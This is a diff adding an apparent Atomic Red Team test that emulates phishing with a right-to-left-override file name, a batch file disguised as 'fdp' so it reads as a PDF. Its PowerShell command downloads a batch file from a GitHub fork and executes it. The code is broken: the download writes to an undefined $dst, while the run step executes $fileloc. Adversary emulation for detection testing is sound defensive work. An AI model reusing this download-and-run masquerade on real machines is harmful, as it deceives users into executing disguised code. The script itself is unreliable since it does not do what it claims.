@@ -24,4 +24,25 @@
       Out-File -FilePath $fullPath -InputObject $batchContent -Encoding ascii
     elevation_required: false
 
+ name: T1036.002 - RTLO file download
+  description: 'Simulates downloading a file from a phishing email that has RTLO applied to it. '
+  supported_platforms:
+    - windows
+  input_arguments:
+    fileloc:
+      type: path
+      default: '[System.IO.Path]::Combine($env:USERPROFILE, "Downloads")'
+      description: Input the file location. Default is the downloads folder.
+  executor:
+    command: |-
+      $rtlo = [char]0x202E
+      $fileloc = Join-Path "#{fileloc}" ("evil_file" + $rtlo + "fdp.bat")
+      Invoke-WebRequest -Uri "https://github.com/sp0r1um/atomic-red-team/blob/T1036.002/atomics/T1036.002/src/evil_document.bat" -OutFile $dst -UseBasicParsing
+      Start-Process -FilePath $fileloc -Wait
+    cleanup_command: |-
+      $rtlo = [char]0x202E
+      $fileloc = Join-Path "#{fileloc}" ("evil_file" + $rtlo + "fdp.bat")
+      Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
+    name: powershell
+    elevation_required: false
     
